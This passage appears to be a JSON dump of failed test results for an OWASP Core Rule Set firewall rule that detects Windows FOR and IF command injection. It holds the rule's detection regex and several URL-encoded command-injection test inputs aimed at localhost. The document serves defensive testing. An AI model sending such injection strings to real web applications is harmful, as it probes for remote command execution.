          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 15,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 15,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FF+%22options%22+%25a+IN+%28%22text%22%29+DO+abc",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 16,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 16,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FL+++++++++++%25a+IN+%28start%2Cstep%2Cend%29+DO+abc",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 17,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 17,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FL+%2FL+%2FL+++++%25a+IN+%28start%2Cstep%2Cend%29+DO+abc",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 18,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 18,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FR+C%3A%5Cbla++++%25A+IN+%28set%29+DO+abc",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
